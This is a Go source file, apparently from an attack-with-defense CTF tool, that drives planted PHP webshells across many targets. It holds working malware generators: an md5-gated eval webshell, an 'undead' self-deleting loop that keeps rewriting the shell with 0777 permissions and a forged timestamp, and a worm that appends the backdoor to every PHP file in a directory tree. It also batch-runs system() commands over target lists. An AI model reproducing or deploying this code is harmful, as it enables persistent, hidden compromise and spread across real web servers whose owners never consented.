package logic

import (
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"

	"awd-h1m-pro/internal/config"
	"awd-h1m-pro/internal/netutil"
	"awd-h1m-pro/internal/util"
)

func NewAttackService() *AttackService {
	cfg := config.Clone()
	return &AttackService{
		client: netutil.NewClient(cfg.Shell.Proxy, getRequestTimeout()),
	}
}

func getRequestTimeout() time.Duration {
	cfg := config.Clone()
	if cfg.Shell.Timeout <= 0 {
		return 5 * time.Second
	}
	return time.Duration(cfg.Shell.Timeout) * time.Second
}

func (s *AttackService) buildShellRequest(target string, query map[string]string, field, payload string) (string, map[string]string) {
	rawURL := buildURL(target)
	mergedQuery := mergeShellQuery(parseShellQuery(config.Clone().Shell.Query), query)
	if len(mergedQuery) > 0 {
		rawURL = buildURLWithQuery(rawURL, mergedQuery)
	}
	form := map[string]string{}
	if field != "" {
		form[field] = payload
	}
	return rawURL, form
}

func (s *AttackService) ExecCommandViaShell(target, command string) (CommandResult, error) {
	cfg := config.Clone()
	url, form := s.buildShellRequest(target, nil, cfg.Shell.Pass, shellCommandPayload(command))
	return s.doShellRequest(target, url, cfg.Shell.Method, form)
}

func (s *AttackService) ExecCommandViaUndeadHorse(target, command string) (CommandResult, error) {
	cfg := config.Clone()
	url, form := s.buildAltShellRequest(target, cfg.UndeadHorse.Filename, map[string]string{
		"pass": cfg.UndeadHorse.Pass,
	}, cfg.Shell.Pass, phpExecPayload(command))
	return s.doShellRequest(target, url, "POST", form)
}

func (s *AttackService) ExecCommandViaWormShell(target, command string) (CommandResult, error) {
	cfg := config.Clone()
	url, form := s.buildAltShellRequest(target, cfg.Shell.File, map[string]string{
		"pass": cfg.WormShell.Pass,
	}, cfg.Shell.Pass, phpExecPayload(command))
	return s.doShellRequest(target, url, "POST", form)
}

func (s *AttackService) ExecCommandViaMd5Horse(target, urlPass, pass, postField, command string) (CommandResult, error) {
	_ = urlPass
	cfg := config.Clone()
	url, form := s.buildAltShellRequest(target, cfg.UndeadHorse.Filename, map[string]string{
		"pass": pass,
	}, postField, phpExecPayload(command))
	return s.doShellRequest(target, url, "POST", form)
}

func (s *AttackService) doShellRequest(target, rawURL, method string, form map[string]string) (CommandResult, error) {
	result := CommandResult{Target: target}
	client := netutil.NewClient(config.Clone().Shell.Proxy, getRequestTimeout())
	request := client.R().SetFormData(form)
	requestBody := encodeFormBody(form)
	var (
		statusCode int
		statusText string
		respText   string
		err        error
	)
	switch strings.ToUpper(strings.TrimSpace(method)) {
	case "GET":
		parsed, parseErr := url.Parse(rawURL)
		if parseErr == nil {
			values := parsed.Query()
			for key, value := range form {
				values.Set(key, value)
			}
			parsed.RawQuery = values.Encode()
			rawURL = parsed.String()
		}
		httpResp, requestErr := request.Get(rawURL)
		err = requestErr
		if httpResp != nil {
			if err == nil && httpResp.Err != nil {
				err = httpResp.Err
			}
			if httpResp.Response != nil {
				statusCode = httpResp.GetStatusCode()
				statusText = httpResp.GetStatus()
				respText = httpResp.String()
			}
		}
	default:
		httpResp, requestErr := request.Post(rawURL)
		err = requestErr
		if httpResp != nil {
			if err == nil && httpResp.Err != nil {
				err = httpResp.Err
			}
			if httpResp.Response != nil {
				statusCode = httpResp.GetStatusCode()
				statusText = httpResp.GetStatus()
				respText = httpResp.String()
			}
		}
	}
	if err != nil {
		netutil.LogHTTPError(method, rawURL, requestBody, statusCode, err)
		result.Message = err.Error()
		return result, err
	}
	if statusCode >= 400 {
		message := strings.TrimSpace(respText)
		if message == "" {
			message = statusText
		}
		err = fmt.Errorf("http %d: %s", statusCode, message)
		netutil.LogHTTPError(method, rawURL, requestBody, statusCode, err)
		result.Message = err.Error()
		return result, err
	}
	result.Success = true
	result.Output = normalizeCommandOutput(respText)
	result.Message = "ok"
	return result, nil
}

func (s *AttackService) ExecCommand(shellType ShellType, target, command string) (CommandResult, error) {
	switch shellType {
	case ShellTypeUndead:
		return s.ExecCommandViaUndeadHorse(target, command)
	case ShellTypeWorm:
		return s.ExecCommandViaWormShell(target, command)
	case ShellTypeMD5:
		cfg := config.Clone()
		return s.ExecCommandViaMd5Horse(target, "pass", cfg.UndeadHorse.Pass, cfg.Shell.Pass, command)
	default:
		return s.ExecCommandViaShell(target, command)
	}
}

func (s *AttackService) ExecCommandForTargets(shellType ShellType, targets []string, command string) ([]CommandResult, error) {
	results := make([]CommandResult, 0, len(targets))
	for _, target := range util.UniqueSorted(targets) {
		result, err := s.ExecCommand(shellType, target, command)
		if err != nil {
			result.Success = false
			if result.Message == "" {
				result.Message = err.Error()
			}
		}
		results = append(results, result)
	}
	return results, nil
}

func normalizeCommandOutput(output string) string {
	output = strings.TrimSpace(output)
	output = strings.TrimPrefix(output, "__AWD_BEGIN__")
	output = strings.TrimSuffix(output, "__AWD_END__")
	return strings.TrimSpace(output)
}

func (s *AttackService) GetTaskStatus(taskID string) *TaskState {
	if value, ok := s.tasks.Load(taskID); ok {
		if state, ok := value.(*TaskState); ok {
			copyState := *state
			return &copyState
		}
	}
	return nil
}

func (s *AttackService) updateTaskProgress(taskID string, current, total int64, message, status string) {
	state := s.ensureTask(taskID)
	state.Current = current
	state.Total = total
	state.Message = message
	state.Status = status
	state.LastUpdated = time.Now()
}

func (s *AttackService) completeTask(taskID string, status string, results []CommandResult, err error) {
	state := s.ensureTask(taskID)
	state.Status = status
	state.Results = results
	state.LastUpdated = time.Now()
	finished := time.Now()
	state.FinishedAt = &finished
	if err != nil {
		state.LastError = err.Error()
		state.Message = err.Error()
	}
}

func (s *AttackService) ensureTask(taskID string) *TaskState {
	if value, ok := s.tasks.Load(taskID); ok {
		return value.(*TaskState)
	}
	state := &TaskState{
		TaskID:      taskID,
		Status:      "pending",
		StartedAt:   time.Now(),
		LastUpdated: time.Now(),
	}
	s.tasks.Store(taskID, state)
	return state
}

func (s *AttackService) TestShellAsync(targets []string, progress func(ProgressEvent)) string {
	taskID := nextTaskID("shell-test")
	state := s.ensureTask(taskID)
	state.Total = int64(len(targets))
	go func() {
		successLines := make([]string, 0)
		errorLines := make([]string, 0)
		results := make([]CommandResult, 0, len(targets))
		for idx, target := range targets {
			result, err := s.ExecCommandViaShell(target, "echo AWD_OK")
			if err != nil || !strings.Contains(strings.ToUpper(result.Output), "AWD_OK") {
				if result.Message == "" && err != nil {
					result.Message = err.Error()
				}
				errorLines = append(errorLines, target)
				result.Success = false
			} else {
				successLines = append(successLines, target)
				result.Success = true
			}
			results = append(results, result)
			s.updateTaskProgress(taskID, int64(idx+1), int64(len(targets)), target, "running")
			if progress != nil {
				progress(ProgressEvent{TaskID: taskID, Current: int64(idx + 1), Total: int64(len(targets)), Message: target, Status: "running"})
			}
		}
		_ = util.WriteLinesAtomic(filepath.Join(util.OutputDir(), "success.txt"), successLines)
		_ = util.AppendLines(filepath.Join(util.OutputDir(), "error.txt"), errorLines)
		s.completeTask(taskID, "done", results, nil)
		if progress != nil {
			progress(ProgressEvent{TaskID: taskID, Current: int64(len(targets)), Total: int64(len(targets)), Message: "completed", Status: "done"})
		}
	}()
	return taskID
}

func (s *AttackService) UploadUndeadHorseAsync(targets []string, urlPass, pass string, progress func(ProgressEvent)) string {
	taskID := nextTaskID("undead-upload")
	state := s.ensureTask(taskID)
	state.Total = int64(len(targets))
	go func() {
		var results []CommandResult
		var okLines, errLines []string
		cfg := config.Clone()
		payload := loadCustomPayloadOrDefault("undead.php", generateUndeadHorseCode(pass, cfg.UndeadHorse.Filename))
		uploadSnippet := phpWriteRelativeFilePayload(cfg.UndeadHorse.Filename, payload)
		for idx, target := range targets {
			result, err := s.runPHPSnippetViaShell(target, uploadSnippet)
			if err != nil {
				result.Success = false
				result.Message = err.Error()
				errLines = append(errLines, target)
			} else {
				s.triggerUndeadHorse(buildURLForTargetPath(target, remoteJoin(cfg.Shell.Path, cfg.UndeadHorse.Filename)))
				time.Sleep(500 * time.Millisecond)
				var (
					testResult CommandResult
					testErr    error
				)
				for attempt := 0; attempt < 5; attempt++ {
					testResult, testErr = s.ExecCommandViaMd5Horse(target, urlPass, pass, cfg.Shell.Pass, "echo AWD_OK")
					if testErr == nil && strings.Contains(strings.ToUpper(testResult.Output), "AWD_OK") {
						break
					}
					time.Sleep(400 * time.Millisecond)
				}
				if testErr == nil && strings.Contains(strings.ToUpper(testResult.Output), "AWD_OK") {
					okLines = append(okLines, target)
					result.Success = true
				} else {
					if testErr != nil {
						result.Message = testErr.Error()
					}
					errLines = append(errLines, target)
				}
			}
			results = append(results, result)
			s.updateTaskProgress(taskID, int64(idx+1), int64(len(targets)), target, "running")
			if progress != nil {
				progress(ProgressEvent{TaskID: taskID, Current: int64(idx + 1), Total: int64(len(targets)), Message: target, Status: "running"})
			}
		}
		_ = util.WriteLinesAtomic(filepath.Join(util.OutputDir(), "undead_horse_success.txt"), okLines)
		_ = util.AppendLines(filepath.Join(util.OutputDir(), "undead_horse_error.txt"), errLines)
		s.completeTask(taskID, "done", results, nil)
	}()
	return taskID
}

func (s *AttackService) triggerUndeadHorse(rawURL string) {
	go func() {
		client := netutil.NewClient(config.Clone().Shell.Proxy, 1500*time.Millisecond)
		resp, err := client.R().Get(rawURL)
		if err != nil {
			netutil.LogHTTPError("GET", rawURL, nil, 0, err)
			return
		}
		if resp != nil && resp.GetStatusCode() >= 400 {
			netutil.LogHTTPError("GET", rawURL, nil, resp.GetStatusCode(), fmt.Errorf("http %d: %s", resp.GetStatusCode(), strings.TrimSpace(resp.String())))
		}
	}()
}

func (s *AttackService) UploadMd5Horse(targets []string, pass, postField string) ([]CommandResult, error) {
	cfg := config.Clone()
	payload := loadCustomPayloadOrDefault("md5.php", generateMd5HorseCode(pass, postField))
	uploadSnippet := phpWriteRelativeFilePayload(cfg.UndeadHorse.Filename, payload)
	var results []CommandResult
	var okLines, errLines []string
	for _, target := range targets {
		result, err := s.runPHPSnippetViaShell(target, uploadSnippet)
		if err != nil {
			result.Success = false
			result.Message = err.Error()
			errLines = append(errLines, target)
		} else {
			okLines = append(okLines, target)
			result.Success = true
		}
		results = append(results, result)
	}
	_ = util.WriteLinesAtomic(filepath.Join(util.OutputDir(), "md5_horse_success.txt"), okLines)
	_ = util.AppendLines(filepath.Join(util.OutputDir(), "md5_horse_error.txt"), errLines)
	return results, nil
}

func (s *AttackService) UploadWormShell(targets []string, urlPass, pass string) ([]CommandResult, error) {
	cfg := config.Clone()
	payload := loadCustomPayloadOrDefault("worm.php", generateWormCode(pass, cfg.Shell.Pass))
	var results []CommandResult
	var infectedPaths, outputs []string
	for _, target := range targets {
		relativePath := ".template.php"
		snippet := phpWriteRelativeFilePayload(relativePath, payload) + ";include " + phpRelativeFileExpr(relativePath) + ";"
		result, err := s.runPHPSnippetViaShell(target, snippet)
		if err != nil {
			result.Success = false
			result.Message = err.Error()
		} else {
			result.Success = true
			if result.Output != "" {
				lines := strings.Split(strings.ReplaceAll(result.Output, "\r\n", "\n"), "\n")
				for _, line := range lines {
					line = strings.TrimSpace(line)
					if strings.Contains(line, "intofile") {
						infectedPaths = append(infectedPaths, line)
					}
					if line != "" {
						outputs = append(outputs, line)
					}
				}
			}
		}
		results = append(results, result)
	}
	_ = util.WriteLinesAtomic(filepath.Join(util.OutputDir(), "worm_paths.txt"), infectedPaths)
	_ = util.WriteLinesAtomic(filepath.Join(util.OutputDir(), "worm_paths_all.txt"), outputs)
	_ = urlPass
	return results, nil
}

func generateMd5HorseCode(pass, postField string) string {
	sum := md5.Sum([]byte(pass))
	return fmt.Sprintf("<?php if(md5($_GET['pass'])=='%s'){@eval($_POST['%s']);}?>", hex.EncodeToString(sum[:]), postField)
}

func generateUndeadHorseCode(pass, filename string) string {
	md5Horse := generateMd5HorseCode(pass, config.Clone().Shell.Pass)
	encoded := base64.StdEncoding.EncodeToString([]byte(md5Horse))
	return fmt.Sprintf(`<?php
    error_reporting(0);
    set_time_limit(0);
    ignore_user_abort(1);
    unlink(__FILE__);

 $file = __DIR__ . '/%s';
 $code = base64_decode('%s');
 while(true) {
     if(!file_exists($file) || md5(file_get_contents($file))!==md5($code)) {
         file_put_contents($file, $code);
     }
     @chmod($file, 0777);
     touch($file,mktime(20,15,1,11,28,2021));
     usleep(100);
 }
?>`, strings.TrimLeft(strings.ReplaceAll(filename, `\`, `/`), "/"), encoded)
}

func generateWormCode(pass, postField string) string {
	md5Horse := generateMd5HorseCode(pass, postField)
	encoded := base64.StdEncoding.EncodeToString([]byte(md5Horse))
	return fmt.Sprintf(`<?php
$payload = base64_decode('%s');
$count = 0;
$rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator(__DIR__));
foreach ($rii as $file) {
    if ($file->isDir()) { continue; }
    $filepath = $file->getPathname();
    if (substr($filepath, -4) !== '.php') { continue; }
    if (substr($filepath, -13) === '.template.php') { continue; }
    $content = @file_get_contents($filepath);
    if ($content === false) { continue; }
    if (strpos($content, $payload) !== false) { continue; }
    if (@file_put_contents($filepath, $content . "\n" . $payload) !== false) {
        $count++;
        echo "success " . $filepath . " intofile\n";
    }
}
echo "total " . $count . " files infected\n";
@unlink(__FILE__);
?>`, encoded)
}

func LoadPayload(path string) (string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	return string(data), nil
}

func loadCustomPayloadOrDefault(name, fallback string) string {
	path := filepath.Join(util.OutputDir(), "payloads", name)
	payload, err := LoadPayload(path)
	if err != nil {
		return fallback
	}
	payload = strings.TrimSpace(payload)
	if payload == "" {
		return fallback
	}
	return payload
}

func extractDomain(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	if strings.HasPrefix(raw, "http://") || strings.HasPrefix(raw, "https://") {
		if parsed, err := url.Parse(raw); err == nil {
			return parsed.Hostname()
		}
	}
	return strings.TrimPrefix(strings.TrimPrefix(raw, "http://"), "https://")
}

func appendToFile(path, line string) error {
	file, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = file.WriteString(strings.TrimSpace(line) + "\n")
	return err
}

func phpExecPayload(command string) string {
	return fmt.Sprintf(`echo "__AWD_BEGIN__"; system(%s . " 2>&1"); echo "__AWD_END__";`, phpSingleQuote(command))
}

func phpWriteFilePayload(path, content string) string {
	return fmt.Sprintf(`file_put_contents(%s, base64_decode(%s)); chmod(%s, 0777); echo "OK";`, phpSingleQuote(path), phpSingleQuote(base64.StdEncoding.EncodeToString([]byte(content))), phpSingleQuote(path))
}

func phpWriteRelativeFilePayload(filename, content string) string {
	pathExpr := phpRelativeFileExpr(filename)
	return fmt.Sprintf(`$__awd_path=%s; file_put_contents($__awd_path, base64_decode(%s)); chmod($__awd_path, 0777); echo "OK";`, pathExpr, phpSingleQuote(base64.StdEncoding.EncodeToString([]byte(content))))
}

func (s *AttackService) runPHPSnippetViaShell(target, snippet string) (CommandResult, error) {
	if shellPayloadMode() != "php" {
		err := fmt.Errorf("normal shell is in raw command mode; PHP snippet operations are unsupported")
		return CommandResult{Target: target, Message: err.Error()}, err
	}
	cfg := config.Clone()
	url, form := s.buildShellRequest(target, nil, cfg.Shell.Pass, snippet)
	return s.doShellRequest(target, url, cfg.Shell.Method, form)
}

func (s *AttackService) buildAltShellRequest(target, remoteFile string, query map[string]string, field, payload string) (string, map[string]string) {
	rawURL := buildURLForTargetPath(target, remoteJoin(config.Clone().Shell.Path, remoteFile))
	if len(query) > 0 {
		rawURL = buildURLWithQuery(rawURL, query)
	}
	form := map[string]string{}
	if field != "" {
		form[field] = payload
	}
	return rawURL, form
}

func phpSingleQuote(value string) string {
	value = strings.ReplaceAll(value, `\`, `\\`)
	value = strings.ReplaceAll(value, `'`, `\'`)
	return "'" + value + "'"
}

func phpRelativeFileExpr(filename string) string {
	filename = strings.TrimSpace(strings.ReplaceAll(filename, `\`, `/`))
	filename = strings.TrimLeft(filename, "/")
	if filename == "" {
		filename = "."
	}
	return "__DIR__ . '/' . " + phpSingleQuote(filename)
}

func encodeFormBody(form map[string]string) []byte {
	if len(form) == 0 {
		return nil
	}
	values := url.Values{}
	for key, value := range form {
		values.Set(key, value)
	}
	return []byte(values.Encode())
}

func shellPayloadMode() string {
	if strings.EqualFold(strings.TrimSpace(config.Clone().Shell.Payload), "raw") {
		return "raw"
	}
	return "php"
}

func shellCommandPayload(command string) string {
	if shellPayloadMode() == "raw" {
		return strings.TrimSpace(command)
	}
	return phpExecPayload(command)
}

func parseShellQuery(raw string) map[string]string {
	raw = strings.TrimSpace(raw)
	raw = strings.TrimPrefix(raw, "?")
	raw = strings.ReplaceAll(raw, "\r\n", "&")
	raw = strings.ReplaceAll(raw, "\n", "&")
	if raw == "" {
		return nil
	}
	values, err := url.ParseQuery(raw)
	if err != nil {
		return nil
	}
	query := make(map[string]string, len(values))
	for key, items := range values {
		key = strings.TrimSpace(key)
		if key == "" || len(items) == 0 {
			continue
		}
		query[key] = items[len(items)-1]
	}
	if len(query) == 0 {
		return nil
	}
	return query
}

func mergeShellQuery(base, extra map[string]string) map[string]string {
	if len(base) == 0 && len(extra) == 0 {
		return nil
	}
	merged := make(map[string]string, len(base)+len(extra))
	for key, value := range base {
		merged[key] = value
	}
	for key, value := range extra {
		merged[key] = value
	}
	return merged
}
